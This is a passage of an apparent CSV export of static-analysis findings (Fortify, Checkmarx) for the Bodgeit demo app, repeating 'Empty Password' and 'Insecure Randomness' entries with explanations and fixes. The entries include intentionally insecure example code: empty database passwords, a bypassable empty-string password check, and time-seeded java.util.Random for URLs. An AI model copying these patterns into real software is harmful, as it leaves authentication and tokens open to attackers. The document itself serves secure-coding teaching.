string, attempts to read a stored value for the password, and compares it against a user-supplied value. <pre> ... String storedPassword = """"; String temp; if ((temp = readPassword()) != null) { storedPassword = temp; } if(storedPassword.equals(userPassword)) // Access protected resources ... } ... </pre> If <code>readPassword()</code> fails to retrieve the stored password due to a database error or another problem, then an attacker could trivially bypass the password check by providing an empty string for <code>userPassword</code>. In the mobile world, password management is even trickier, considering a much higher chance of device loss. <b>Example 3:</b> The code below initializes username and password variables to empty strings, reads credentials from an Android WebView store if they have not been previously rejected by the server for the current request, and uses them to setup authentication for viewing protected pages. <pre> ... webview.setWebViewClient(new WebViewClient() { public void onReceivedHttpAuthRequest(WebView view, HttpAuthHandler handler, String host, String realm) { String username = """"; String password = """"; if (handler.useHttpAuthUsernamePassword()) { String[] credentials = view.getHttpAuthUsernamePassword(host, realm); username = credentials[0]; password = credentials[1]; } handler.proceed(username, password); } }); ... </pre> Similar to Example 2, if <code>useHttpAuthUsernamePassword()</code> returns <code>false</code>, an attacker will be able to view protected pages by supplying an empty password.</Content>","Recommendations: <Content>Always read stored password values from encrypted, external resources and assign password variables meaningful values. Ensure that sensitive resources are never protected with empty or null passwords. For Android, as well as any other platform that uses SQLite database, a good option is SQLCipher -- an extension to SQLite database that provides transparent 256-bit AES encryption of database files. Thus, credentials can be stored in an encrypted database. <b>Example 4:</b> The code below demonstrates how to integrate SQLCipher into an Android application after downloading the necessary binaries, and store credentials into the database file. <pre> import net.sqlcipher.database.SQLiteDatabase; ... SQLiteDatabase.loadLibs(this); File dbFile = getDatabasePath(""credentials.db""); dbFile.mkdirs(); dbFile.delete(); SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(dbFile, ""credentials"", null); db.execSQL(""create table credentials(u, p)""); db.execSQL(""insert into credentials(u, p) values(?, ?)"", new Object[]{username, password}); ... </pre> Note that references to <code>android.database.sqlite.SQLiteDatabase</code> are substituted with those of <code>net.sqlcipher.database.SQLiteDatabase</code>. To enable encryption on the WebView store, WebKit has to be re-compiled with the <code>sqlcipher.so</code> library.</Content> Tips: 1.The Fortify Java Annotations FortifyPassword and FortifyNotPassword can be used to indicate which fields and variables represent passwords. 2.When identifying null, empty, or hardcoded passwords, default rules only consider fields and variables that contain the word <code>password</code>. However, the HPE Security Fortify Custom Rules Editor provides the Password Management wizard that makes it easy to create rules for detecting password management issues on custom-named fields and variables.","","",""
"DemoApps","","Bodgeit","161","Password Management: Empty Password","","High","Open","2015-10-15","Fortify SCA","259","Use of Hard-coded Password","","root/init.jsp","","","http://localhost/root/init.jsp","","","","Abstract: <Content>Empty passwords may compromise system security in a way that cannot be easily remedied.</Content> Explanation: <Content>It is never a good idea to assign an empty string to a password variable. If the empty password is used to successfully authenticate against another system, then the corresponding account's security is likely compromised because it accepts an empty password. If the empty password is merely a placeholder until a legitimate value can be assigned to the variable, then it can confuse anyone unfamiliar with the code and potentially cause problems on unexpected control flow paths. <Paragraph> In this case an empty password was found in the call to <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The code below attempts to connect to a database with an empty password. <pre> ... DriverManager.getConnection(url, ""scott"", """"); ... </pre> If the code in Example 1 succeeds, it indicates that the database user account ""scott"" is configured with an empty password, which can be easily guessed by an attacker. Even worse, once the program has shipped, updating the account to use a non-empty password will require a code change. <b>Example 2:</b> The code below initializes a password variable to an empty string, attempts to read a stored value for the password, and compares it against a user-supplied value. <pre> ... String storedPassword = """"; String temp; if ((temp = readPassword()) != null) { storedPassword = temp; } if(storedPassword.equals(userPassword)) // Access protected resources ... } ... </pre> If <code>readPassword()</code> fails to retrieve the stored password due to a database error or another problem, then an attacker could trivially bypass the password check by providing an empty string for <code>userPassword</code>. In the mobile world, password management is even trickier, considering a much higher chance of device loss. <b>Example 3:</b> The code below initializes username and password variables to empty strings, reads credentials from an Android WebView store if they have not been previously rejected by the server for the current request, and uses them to setup authentication for viewing protected pages. <pre> ... webview.setWebViewClient(new WebViewClient() { public void onReceivedHttpAuthRequest(WebView view, HttpAuthHandler handler, String host, String realm) { String username = """"; String password = """"; if (handler.useHttpAuthUsernamePassword()) { String[] credentials = view.getHttpAuthUsernamePassword(host, realm); username = credentials[0]; password = credentials[1]; } handler.proceed(username, password); } }); ... </pre> Similar to Example 2, if <code>useHttpAuthUsernamePassword()</code> returns <code>false</code>, an attacker will be able to view protected pages by supplying an empty password.</Content>","Recommendations: <Content>Always read stored password values from encrypted, external resources and assign password variables meaningful values. Ensure that sensitive resources are never protected with empty or null passwords. For Android, as well as any other platform that uses SQLite database, a good option is SQLCipher -- an extension to SQLite database that provides transparent 256-bit AES encryption of database files. Thus, credentials can be stored in an encrypted database. <b>Example 4:</b> The code below demonstrates how to integrate SQLCipher into an Android application after downloading the necessary binaries, and store credentials into the database file. <pre> import net.sqlcipher.database.SQLiteDatabase; ... SQLiteDatabase.loadLibs(this); File dbFile = getDatabasePath(""credentials.db""); dbFile.mkdirs(); dbFile.delete(); SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(dbFile, ""credentials"", null); db.execSQL(""create table credentials(u, p)""); db.execSQL(""insert into credentials(u, p) values(?, ?)"", new Object[]{username, password}); ... </pre> Note that references to <code>android.database.sqlite.SQLiteDatabase</code> are substituted with those of <code>net.sqlcipher.database.SQLiteDatabase</code>. To enable encryption on the WebView store, WebKit has to be re-compiled with the <code>sqlcipher.so</code> library.</Content> Tips: 1.The Fortify Java Annotations FortifyPassword and FortifyNotPassword can be used to indicate which fields and variables represent passwords. 2.When identifying null, empty, or hardcoded passwords, default rules only consider fields and variables that contain the word <code>password</code>. However, the HPE Security Fortify Custom Rules Editor provides the Password Management wizard that makes it easy to create rules for detecting password management issues on custom-named fields and variables.","","",""
"DemoApps","","Bodgeit","143","Insecure Randomness","","High","Open","2015-10-15","Fortify SCA,Checkmarx","330","Use of Insufficiently Random Values","","root/contact.jsp","","","http://localhost/root/contact.jsp","","","","Abstract: <Content><Paragraph>The random number generator implemented by <Replace key=""PrimaryCall.name""/> cannot withstand a cryptographic attack.<AltParagraph>Standard pseudorandom number generators cannot withstand cryptographic attacks.</AltParagraph></Paragraph></Content> Explanation: <Content>Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in security-sensitive context. <Paragraph> In this case the function that generates weak random numbers is <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> Computers are deterministic machines, and as such are unable to produce true randomness. Pseudorandom Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated. There are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and forms an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between it and a truly random value. In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing. <b>Example:</b> The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase. <pre> String GenerateReceiptURL(String baseUrl) { Random ranGen = new Random(); ranGen.setSeed((new Date()).getTime()); return (baseUrl + ranGen.nextInt(400000000) + "".html""); } </pre> This code uses the <code>Random.nextInt()</code> function to generate ""unique"" identifiers for the receipt pages it generates. Because <code>Random.nextInt()</code> is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.</Content>","Recommendations: <Content>When unpredictability is critical, as is the case with most security-sensitive uses of randomness, use a cryptographic PRNG. Regardless of the PRNG you choose, always use a value with sufficient entropy to seed the algorithm. (Values such as the current time offer only negligible entropy and should not be used.) The Java language provides a cryptographic PRNG in <code>java.security.SecureRandom</code>. As is the case with other algorithm-based classes in <code>java.security</code>, <code>SecureRandom</code> provides an implementation-independent wrapper around a particular set of algorithms. When you request an instance of a <code>SecureRandom</code> object using <code>SecureRandom.getInstance()</code>, you can request a specific implementation of the algorithm. If the algorithm is available, then it is given as a <code>SecureRandom</code> object. If it is unavailable or if you do not specify a particular implementation, then you are given a <code>SecureRandom</code> implementation selected by the system. Sun provides a single <code>SecureRandom</code> implementation with the Java distribution named <code>SHA1PRNG</code>, which Sun describes as computing: ""The SHA-1 hash over a true-random seed value concatenated with a 64-bit counter which is incremented by 1 for each operation. From the 160-bit SHA-1 output, only 64 bits are used [1]."" However, the specifics of the Sun implementation of the <code>SHA1PRNG</code> algorithm are poorly documented, and it is unclear what sources of entropy the implementation uses and therefore what amount of true randomness exists in its output. Although there is speculation on the Web about the Sun implementation, there is no evidence to contradict the claim that the algorithm is cryptographically strong and can be used safely in security-sensitive contexts.</Content>","","",""
"DemoApps","","Bodgeit","264","Insecure Randomness","","High","Open","2015-10-15","Fortify SCA,Checkmarx","330","Use of Insufficiently Random Values","","root/home.jsp","","","http://localhost/root/home.jsp","","","","Abstract: <Content><Paragraph>The random number generator implemented by <Replace key=""PrimaryCall.name""/> cannot withstand a cryptographic attack.<AltParagraph>Standard pseudorandom number generators cannot withstand cryptographic attacks.</AltParagraph></Paragraph></Content> Explanation: <Content>Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in security-sensitive context. <Paragraph> In this case the function that generates weak random numbers is <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> Computers are deterministic machines, and as such are unable to produce true randomness. Pseudorandom Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated. There are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and forms an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between it and a truly random value. In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing. <b>Example:</b> The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase. <pre> String GenerateReceiptURL(String baseUrl) { Random ranGen = new Random(); ranGen.setSeed((new Date()).getTime()); return (baseUrl + ranGen.nextInt(400000000) + "".html""); } </pre> This code uses the <code>Random.nextInt()</code> function to generate ""unique"" identifiers for the receipt pages it generates. Because <code>Random.nextInt()</code> is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.</Content>","Recommendations: <Content>When unpredictability is critical, as is the case with most security-sensitive uses of randomness, use a cryptographic PRNG. Regardless of the PRNG you choose, always use a value with sufficient entropy to seed the algorithm. (Values such as the current time offer only negligible entropy and should not be used.) The Java language provides a cryptographic PRNG in <code>java.security.SecureRandom</code>. As is the case with other algorithm-based classes in <code>java.security</code>, <code>SecureRandom</code> provides an implementation-independent wrapper around a particular set of algorithms. When you request an instance of a <code>SecureRandom</code> object using <code>SecureRandom.getInstance()</code>, you can request a specific implementation of the algorithm. If the algorithm is available, then it is given as a <code>SecureRandom</code> object. If it is unavailable or if you do not specify a particular implementation, then you are given a <code>SecureRandom</code> implementation selected by the system. Sun provides a single <code>SecureRandom</code> implementation with the Java distribution named <code>SHA1PRNG</code>, which Sun describes as computing: ""The SHA-1 hash over a true-random seed value concatenated with a 64-bit counter which is incremented by 1 for each operation. From the 160-bit SHA-1 output, only 64 bits are used [1]."" However, the specifics of the Sun implementation of the <code>SHA1PRNG</code> algorithm are poorly documented, and it is unclear what sources of entropy the implementation uses and therefore what amount of true randomness exists in its output. Although there is speculation on the Web about the Sun implementation, there is no evidence to contradict the claim that the algorithm is cryptographically strong and can be used safely in security-sensitive contexts.</Content>","","",""
"DemoApps","","Bodgeit","110","Insecure Randomness","","High","Open","2015-10-15","Fortify SCA","330","Use of Insufficiently Random Values","","root/init.jsp","","","http://localhost/root/init.jsp","","","","Abstract: <Content><Paragraph>The random number generator implemented by <Replace key=""PrimaryCall.name""/> cannot withstand a cryptographic attack.<AltParagraph>Standard pseudorandom number generators cannot withstand cryptographic attacks.</AltParagraph></Paragraph></Content> Explanation: <Content>Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in security-sensitive context. <Paragraph> In this case the function that generates weak random numbers is <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> Computers are deterministic machines, and as such are unable to produce true randomness. Pseudorandom Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated. There are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and forms an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between it and a truly random value. In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing. <b>Example:</b> The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase. <pre> String GenerateReceiptURL(String baseUrl) { Random ranGen = new Random(); ranGen.setSeed((new Date()).getTime()); return (baseUrl + ranGen.nextInt(400000000) + "".html""); } </pre> This code uses the <code>Random.nextInt()</code> function to generate ""unique"" identifiers for the receipt pages it generates. Because <code>Random.nextInt()</code> is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.</Content>","Recommendations: <Content>When unpredictability is critical, as is the case with most security-sensitive uses of randomness, use a cryptographic PRNG. Regardless of the PRNG you choose, always use a value with sufficient entropy to seed the algorithm. (Values such as the current time offer only negligible entropy and should not be used.) The Java language provides a cryptographic PRNG in <code>java.security.SecureRandom</code>. As is the case with other algorithm-based classes in <code>java.security</code>, <code>SecureRandom</code> provides an implementation-independent wrapper around a particular set of algorithms. When you request an instance of a <code>SecureRandom</code> object using <code>SecureRandom.getInstance()</code>, you can request a specific implementation of the algorithm. If the algorithm is available, then it is given as a <code>SecureRandom</code> object. If it is unavailable or if you do not specify a particular implementation, then you are given a <code>SecureRandom</code> implementation selected by the system. Sun provides a single <code>SecureRandom</code> implementation with the Java distribution named <code>SHA1PRNG</code>, which Sun describes as computing: ""The SHA-1 hash over a true-random seed value concatenated with a 64-bit counter which is incremented by 1 for each operation. From the 160-bit SHA-1 output, only 64 bits are used [1]."" However, the specifics of the Sun implementation of the <code>SHA1PRNG</code> algorithm are poorly documented, and it is unclear what sources of entropy the implementation uses and therefore what amount of true randomness exists in its output. Although there is speculation on the Web about the Sun implementation, there is no evidence to contradict the claim that the algorithm is cryptographically strong and can be used safely in security-sensitive contexts.</Content>","","",""
"DemoApps","","Bodgeit","112","Insecure Randomness","","High","Open","2015-10-15","Fortify SCA","330","Use of Insufficiently Random Values","","root/init.jsp","","","http://localhost/root/init.jsp","","","","Abstract: <Content><Paragraph>The random number generator implemented by <Replace key=""PrimaryCall.name""/> cannot withstand a cryptographic attack.<AltParagraph>Standard pseudorandom number generators cannot withstand cryptographic attacks.</AltParagraph></Paragraph></Content> Explanation: <Content>Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in security-sensitive context. <Paragraph> In this case the function that generates weak random numbers is <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> Computers are deterministic machines, and as such are unable to produce true randomness. Pseudorandom Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated. There are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and forms an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between it and a truly random value. In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing. <b>Example:</b> The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase. <pre> String GenerateReceiptURL(String baseUrl) { Random ranGen = new Random(); ranGen.setSeed((new Date()).getTime()); return (baseUrl + ranGen.nextInt(400000000) + "".html""); } </pre> This code uses the <code>Random.nextInt()</code> function to generate ""unique"" identifiers for the receipt pages it generates. Because <code>Random.nextInt()</code> is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.</Content>","Recommendations: <Content>When unpredictability is critical, as is the case with most security-sensitive uses of randomness, use a cryptographic PRNG. Regardless of the PRNG you choose, always use a value with sufficient entropy to seed the algorithm. (Values such as the current time offer only negligible entropy and should not be used.) The Java language provides a cryptographic PRNG in <code>java.security.SecureRandom</code>. As is the case with other algorithm-based classes in <code>java.security</code>, <code>SecureRandom</code> provides an implementation-independent wrapper around a particular set of algorithms. When you request an instance of a <code>SecureRandom</code> object using <code>SecureRandom.getInstance()</code>, you can request a specific implementation of the algorithm. If the algorithm is available, then it is given as a <code>SecureRandom</code> object. If it is unavailable or if you do not specify a particular implementation, then you are given a <code>SecureRandom</code> implementation selected by the system. Sun provides a single <code>SecureRandom</code> implementation with the Java distribution named <code>SHA1PRNG</code>, which Sun describes as computing: ""The SHA-1 hash over a true-random seed value concatenated with a 64-bit counter which is incremented by 1 for each operation. From the 160-bit SHA-1 output, only 64 bits are used [1]."" However, the specifics of the Sun implementation of the <code>SHA1PRNG</code> algorithm are poorly documented, and it is unclear what sources of entropy the implementation uses and therefore what amount of true randomness exists in its output. Although there is speculation on the Web about the Sun implementation, there is no evidence to contradict the claim that the algorithm is cryptographically strong and can be used safely in security-sensitive contexts.</Content>","","",""
"DemoApps","","Bodgeit","158","Insecure Randomness","","High","Open","2015-10-15","Fortify SCA","330","Use of Insufficiently Random Values","","root/init.jsp","","","http://localhost/root/init.jsp","","","","Abstract: <Content><Paragraph>The random number generator implemented by <Replace key=""PrimaryCall.name""/> cannot withstand a cryptographic attack.<AltParagraph>Standard pseudorandom number generators cannot withstand cryptographic attacks.</AltParagraph></Paragraph></Content> Explanation: <Content>Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in security-sensitive context. <Paragraph> In this case the function that generates weak random numbers is <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> Computers are deterministic machines, and as such are unable to produce true randomness. Pseudorandom Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated. There are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and forms an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between it and a truly random value. In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing. <b>Example:</b> The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase. <pre> String GenerateReceiptURL(String baseUrl) { Random ranGen = new Random(); ranGen.setSeed((new Date()).getTime()); return (baseUrl + ranGen.nextInt(400000000) + "".html""); } </pre> This code uses the <code>Random.nextInt()</code> function to generate ""unique"" identifiers for the receipt pages it generates. Because <code>Random.nextInt()</code> is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.</Content>","Recommendations: <Content>When unpredictability is critical, as is the case with most security-sensitive uses of randomness, use a cryptographic PRNG. Regardless of the PRNG you choose, always use a value with sufficient entropy to seed the algorithm. (Values such as the current time offer only negligible entropy and should not be used.) The Java language provides a cryptographic PRNG in <code>java.security.SecureRandom</code>. As is the case with other algorithm-based classes in <code>java.security</code>, <code>SecureRandom</code> provides an implementation-independent wrapper around a particular set of algorithms. When you request an instance of a <code>SecureRandom</code> object using <code>SecureRandom.getInstance()</code>, you can request a specific implementation of the algorithm. If the algorithm is available, then it is given as a <code>SecureRandom</code> object. If it is unavailable or if you do not specify a particular implementation, then you are given a <code>SecureRandom</code> implementation selected by the system. Sun provides a single <code>SecureRandom</code> implementation with the Java distribution named <code>SHA1PRNG</code>, which Sun describes as computing: ""The SHA-1 hash over a true-random seed value concatenated with a 64-bit counter which is incremented by 1 for each operation. From the 160-bit SHA-1 output, only 64 bits are used [1]."" However, the specifics of the Sun implementation of the <code>SHA1PRNG</code> algorithm are poorly documented, and it is unclear what sources of entropy the implementation uses and therefore what amount of true randomness exists in its output. Although there is speculation on the Web about the Sun implementation, there is no evidence to contradict the claim that the algorithm is cryptographically strong and can be used safely in security-sensitive contexts.</Content>","","",""
"DemoApps","","Bodgeit","225","Insecure Randomness","","High","Open","2015-10-15","Fortify SCA","330","Use of Insufficiently Random Values","","root/init.jsp","","","http://localhost/root/init.jsp","","","","Abstract: <Content><Paragraph>The random number generator implemented by <Replace key=""PrimaryCall.name""/> cannot withstand a cryptographic attack.<AltParagraph>Standard pseudorandom number generators cannot withstand cryptographic attacks.</AltParagraph></Paragraph></Content> Explanation: <Content>Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in security-sensitive context. <Paragraph> In this case the function that generates weak random numbers is <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> Computers are deterministic machines, and as such are unable to produce true randomness. Pseudorandom Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated. There are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and forms an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between it and a truly random value. In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing. <b>Example:</b> The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase. <pre> String GenerateReceiptURL(String baseUrl) { Random ranGen = new Random(); ranGen.setSeed((new Date()).getTime()); return (baseUrl + ranGen.nextInt(400000000) + "".html""); } </pre> This code uses the <code>Random.nextInt()</code> function to generate ""unique"" identifiers for the receipt pages it generates. Because <code>Random.nextInt()</code> is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.</Content>","Recommendations: <Content>When unpredictability is critical, as is the case with most security-sensitive uses of randomness, use a cryptographic PRNG. Regardless of the PRNG you choose, always use a value with sufficient entropy to seed the algorithm. (Values such as the current time offer only negligible entropy and should not be used.) The Java language provides a cryptographic PRNG in <code>java.security.SecureRandom</code>. As is the case with other algorithm-based classes in <code>java.security</code>, <code>SecureRandom</code> provides an implementation-independent wrapper around a particular set of algorithms. When you request an instance of a <code>SecureRandom</code> object using <code>SecureRandom.getInstance()</code>, you can request a specific implementation of the algorithm. If the algorithm is available, then it is given as a <code>SecureRandom</code> object. If it is unavailable or if you do not specify a particular implementation, then you are given a <code>SecureRandom</code> implementation selected by the system. Sun provides a single <code>SecureRandom</code> implementation with the Java distribution named <code>SHA1PRNG</code>, which Sun describes as computing: ""The SHA-1 hash over a true-random seed value concatenated with a 64-bit counter which is incremented by 1 for each operation. From the 160-bit SHA-1 output, only 64 bits are used [1]."" However, the specifics of the Sun implementation of the <code>SHA1PRNG</code> algorithm are poorly documented, and it is unclear what sources of entropy the implementation uses and therefore what amount of true randomness exists in its output. Although there is speculation on the Web about the Sun implementation, there is no evidence to contradict the claim that the algorithm is cryptographically strong and can be used safely in security-sensitive contexts.</Content>","","",""
"DemoApps","","Bodgeit","254","Insecure Randomness","","High","Open","2015-10-15","Fortify SCA","330","Use of Insufficiently Random Values","","root/init.jsp","","","http://localhost/root/init.jsp","","","","Abstract: <Content><Paragraph>The random number generator implemented by <Replace key=""PrimaryCall.name""/> cannot withstand a cryptographic attack.<AltParagraph>Standard pseudorandom number generators cannot withstand cryptographic attacks.</AltParagraph></Paragraph></Content> Explanation: <Content>Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in security-sensitive context. <Paragraph> In this case the function that generates weak random numbers is <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> Computers are deterministic machines, and as such are unable to produce true randomness. Pseudorandom Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated. There are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and forms an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between it and a truly random value. In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing. <b>Example:</b> The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase. <pre> String GenerateReceiptURL(String baseUrl) { Random ranGen = new Random(); ranGen.setSeed((new Date()).getTime()); return (baseUrl + ranGen.nextInt(400000000) + "".html""); } </pre> This code uses the <code>Random.nextInt()</code> function to generate ""unique"" identifiers for the receipt pages it generates. Because <code>Random.nextInt()</code> is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.</Content>","Recommendations: <Content>When unpredictability is critical, as is the case with most security-sensitive uses of randomness, use a cryptographic PRNG. Regardless of the PRNG you choose, always use a value with sufficient entropy to seed the algorithm. (Values such as the current time offer only negligible entropy and should not be used.) The Java language provides a cryptographic PRNG in <code>java.security.SecureRandom</code>. As is the case with other algorithm-based classes in <code>java.security</code>, <code>SecureRandom</code> provides an implementation-independent wrapper around a particular set of algorithms. When you request an instance of a <code>SecureRandom</code> object using <code>SecureRandom.getInstance()</code>, you can request a specific implementation of the algorithm. If the algorithm is available, then it is given as a <code>SecureRandom</code> object. If it is unavailable or if you do not specify a particular implementation, then you are given a <code>SecureRandom</code> implementation selected by the system. Sun provides a single <code>SecureRandom</code> implementation with the Java distribution named <code>SHA1PRNG</code>, which Sun describes as computing: ""The SHA-1 hash over a true-random seed value concatenated with a 64-bit counter which is incremented by 1 for each operation. From the 160-bit SHA-1 output, only 64 bits are used [1]."" However, the specifics of the Sun implementation of the <code>SHA1PRNG</code> algorithm are poorly documented, and it is unclear what sources of entropy the implementation uses and therefore what amount of true randomness exists in its output. Although there is speculation on the Web about the Sun implementation, there is no evidence to contradict the claim that the algorithm is cryptographically strong and can be used safely in security-sensitive contexts.</Content>","","",""
"DemoApps","","Bodgeit","257","Insecure Randomness","","High","Open","2015-10-15","Fortify SCA","330","Use of Insufficiently Random Values","","root/init.jsp","","","http://localhost/root/init.jsp","","","","Abstract: <Content><Paragraph>The random number generator implemented by <Replace key=""PrimaryCall.name""/> cannot withstand a cryptographic attack.<AltParagraph>Standard pseudorandom number generators cannot withstand cryptographic attacks.</AltParagraph></Paragraph></Content> Explanation: <Content>Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in security-sensitive context. <Paragraph> In this case the function that generates weak random numbers is <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> Computers are deterministic machines, and as such are unable to produce true randomness. Pseudorandom Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated. There are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and forms an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between it and a truly random value. In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing. <b>Example:</b> The following code 